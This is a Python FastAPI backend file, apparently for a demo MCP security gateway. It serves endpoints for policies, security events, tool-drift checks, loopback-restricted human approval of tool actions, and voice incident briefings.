    allow_origins=["http://localhost:5173", "http://127.0.0.1:5173"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "DELETE", "OPTIONS"],
    allow_headers=[
        "Content-Type",
        "X-Demo-Approver-Token",
        "X-Session-ID",
        "Mcp-Protocol-Version",
        "Mcp-Session-Id",
        "Last-Event-ID",
    ],
    expose_headers=["Mcp-Session-Id", "Mcp-Protocol-Version"],
)


def gateway_for(request: Request) -> Gateway:
    return request.app.state.gateway


def require_loopback_client(request: Request, action: str) -> None:
    try:
        is_local_client = bool(request.client and ipaddress.ip_address(request.client.host).is_loopback)
    except ValueError:
        is_local_client = False
    if not is_local_client:
        raise HTTPException(status_code=403, detail=f"{action} is restricted to loopback clients.")


def authenticate_demo_approver(request: Request) -> str:
    require_loopback_client(request, "Approval action")
    configured_token = os.getenv("MCP_SENTINEL_APPROVER_TOKEN") or "sentinel-demo-approver"
    if len(configured_token) < 12:
        raise HTTPException(status_code=503, detail="MCP_SENTINEL_APPROVER_TOKEN must contain at least 12 characters.")
    supplied_token = request.headers.get("X-Demo-Approver-Token", "")
    if not hmac.compare_digest(supplied_token, configured_token):
        raise HTTPException(status_code=401, detail="Demo approver authentication failed.")
    return os.getenv("MCP_SENTINEL_APPROVER_ID", "demo-approver")[:80]


@app.get("/health")
async def health(request: Request) -> dict[str, Any]:
    overview = await gateway_for(request).overview()
    return {"ok": overview["status"] == "online", **overview}


@app.get("/api/overview")
async def get_overview(request: Request) -> dict[str, Any]:
    return await gateway_for(request).overview()


@app.get("/api/tools", response_model=list[ToolDefinition])
async def get_tools(request: Request) -> list[ToolDefinition]:
    return gateway_for(request).list_tools()


@app.get("/api/security-posture")
async def get_security_posture(request: Request) -> dict[str, Any]:
    gateway = gateway_for(request)
    drift = gateway.tool_drift_report()
    return {"drift": drift, "risk": gateway.explainable_risk(drift)}


@app.get("/api/voice/status")
async def get_voice_status(request: Request) -> dict[str, Any]:
    require_loopback_client(request, "Voice integration")
    return gateway_for(request).voice_configuration()


@app.post("/api/voice/query")
async def query_voice_briefing(body: VoiceQueryRequest, request: Request) -> dict[str, Any]:
    require_loopback_client(request, "Voice briefing")
    gateway = gateway_for(request)
    event = gateway.latest_blocked_incident()
    if event is None:
        raise HTTPException(status_code=404, detail="No blocked incident is available yet. Run a BLOCK scenario first.")
    return {
        "query": body.query,
        "event_id": event.event_id,
        "trace_id": event.trace_id,
        "verdict": event.decision.verdict,
        "policy_id": event.decision.policy_id,
        "text": incident_briefing(event),
        "audio_available": gateway.voice_configuration()["available"],
    }


@app.post("/api/voice/speak")
async def speak_voice_briefing(body: VoiceSpeakRequest, request: Request) -> Response:
    require_loopback_client(request, "Voice playback")
    gateway = gateway_for(request)
    event = gateway.incident_by_id(body.event_id)
    if event is None:
        raise HTTPException(status_code=404, detail="That incident is no longer in the in-memory event window.")
    try:
        audio = await gateway.voice_audio(event)
    except GatewayCallError as exc:
        raise HTTPException(status_code=exc.status_code, detail=exc.detail) from exc
    return Response(
        content=audio,
        media_type="audio/mpeg",
        headers={"Cache-Control": "no-store", "X-Content-Type-Options": "nosniff"},
    )


@app.post("/api/tool-drift/approve")
async def approve_tool_baseline(request: Request) -> dict[str, Any]:
    require_loopback_client(request, "Tool baseline approval")
    gateway = gateway_for(request)
    if not all(gateway.server_status[name].status == "online" for name in SERVER_NAMES):
        raise HTTPException(status_code=409, detail="All controlled MCP servers must be online before capturing a baseline.")
    try:
        return gateway.approve_current_tools()
    except (ValueError, OSError) as exc:
        raise HTTPException(status_code=409, detail=str(exc)) from exc


@app.post("/api/tool-drift/demo")
async def set_tool_drift_demo(body: DriftDemoRequest, request: Request) -> dict[str, Any]:
    require_loopback_client(request, "Drift simulation")
    try:
        return gateway_for(request).set_drift_demo(body.enabled)
    except ValueError as exc:
        raise HTTPException(status_code=409, detail=str(exc)) from exc


@app.get("/api/policies")
async def get_policies(request: Request) -> dict[str, Any]:
    engine = gateway_for(request).policy_engine
    if engine is None:
        return {"status": "unavailable", "error": gateway_for(request).policy_error}
    return {
        "status": "active",
        "policy_id": engine.policy_id,
        "version": engine.version,
        "agents": engine.agents,
        "trusted_destinations": sorted(engine.trusted_destinations),
        "unknown_lineage_external_verdict": engine.unknown_external_verdict,
        "rules": engine.rules,
    }


@app.get("/api/servers", response_model=list[ServerStatus])
async def get_servers(request: Request) -> list[ServerStatus]:
    return gateway_for(request).list_servers()


@app.get("/api/events", response_model=list[SecurityEvent])
async def get_events(
    request: Request,
    limit: int = Query(default=30, ge=1, le=EVENT_LIMIT),
) -> list[SecurityEvent]:
    return list(gateway_for(request).events)[:limit]


@app.get("/api/approvals")
async def get_approvals(
    request: Request,
    limit: int = Query(default=50, ge=1, le=APPROVAL_LIMIT),
) -> list[dict[str, Any]]:
    require_loopback_client(request, "Approval request access")
    return gateway_for(request).list_approvals()[:limit]


@app.post("/api/approvals/{action_id}/approve")
async def approve_action(action_id: str, body: ApprovalDecisionRequest, request: Request) -> dict[str, Any]:
    approver_id = authenticate_demo_approver(request)
    try:
        return gateway_for(request).approve_pending(action_id, approver_id, body.rationale)
    except LookupError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except ValueError as exc:
        raise HTTPException(status_code=409, detail=str(exc)) from exc


@app.post("/api/approvals/{action_id}/deny")
async def deny_action(action_id: str, body: ApprovalDecisionRequest, request: Request) -> dict[str, Any]:
    approver_id = authenticate_demo_approver(request)
    try:
        return gateway_for(request).deny_pending(action_id, approver_id, body.rationale)
    except LookupError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except ValueError as exc:
        raise HTTPException(status_code=409, detail=str(exc)) from exc


@app.post("/api/approvals/{action_id}/execute")
async def execute_action(action_id: str, request: Request) -> dict[str, Any]:
    approver_id = authenticate_demo_approver(request)
    try:
        return await gateway_for(request).execute_approval(action_id, approver_id)
    except LookupError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except ValueError as exc:
        raise HTTPException(status_code=409, detail=str(exc)) from exc
    except GatewayCallError as exc:
        raise HTTPException(status_code=exc.status_code, detail=exc.detail) from exc


@app.get("/api/lineage/{trace_id}", response_model=LineageGraph)
async def get_lineage(trace_id: str, request: Request) -> LineageGraph:
    graph = gateway_for(request).lineage_for_trace(trace_id)
    if graph is None:
        raise HTTPException(status_code=404, detail="No lineage is available for this trace.")
    return graph


@app.post("/api/demo/reset")
async def reset_demo(request: Request) -> dict[str, Any]:
    require_loopback_client(request, "Demo reset")
    try:
        return await gateway_for(request).reset_demo()
    except GatewayCallError as exc:
        raise HTTPException(status_code=exc.status_code, detail=exc.detail) from exc


@app.post("/api/tools/{tool_name}/call")
async def call_tool(tool_name: str, body: ToolCallRequest, request: Request) -> dict[str, Any]:
    gateway = gateway_for(request)
    request_id = short_id("req")
    trace_id = short_id("trc")
    session_id = body.session_id or short_id("ses")
    try:
        result, event = await gateway.invoke(
            tool_name,
            body.arguments,
            request_id=request_id,
            trace_id=trace_id,
            session_id=session_id,
        )
    except GatewayCallError as exc:
        detail: Any = exc.detail
        if isinstance(exc, PolicyDenied):
            detail = {
                "message": exc.detail,
                "decision": exc.decision.model_dump(),
                "event": exc.event.model_dump() if exc.event else None,
            }
        raise HTTPException(status_code=exc.status_code, detail=detail) from exc
    return {"request_id": request_id, "trace_id": trace_id, "session_id": session_id, "result": result, "event": event}


@app.post("/api/scenarios/public-journey")
async def run_public_journey(body: ScenarioRequest) -> dict[str, Any]:
    mcp_url = os.getenv("MCP_SENTINEL_GATEWAY_URL", "http://127.0.0.1:8000/mcp")
    try:
        async with Client(mcp_url) as client:
            response = await client.call_tool("run_public_journey", {"scenario": body.scenario})
    except Exception as exc:
        raise HTTPException(
            status_code=502,
            detail=f"MCP gateway client could not connect to {mcp_url}: {type(exc).__name__}: {str(exc)[:160]}",
        ) from exc
    if response.is_error:
        message = "The MCP gateway rejected the public journey."
        for block in response.content:
            text = getattr(block, "text", None)
            if text:
                message = str(text)[:240]
                break
        raise HTTPException(status_code=502, detail=message)
    if response.structured_content is None:
        raise HTTPException(status_code=502, detail="The MCP gateway returned no structured journey result.")
    return response.structured_content


app.mount("/", mcp_gateway_server.streamable_http_app(json_response=True))
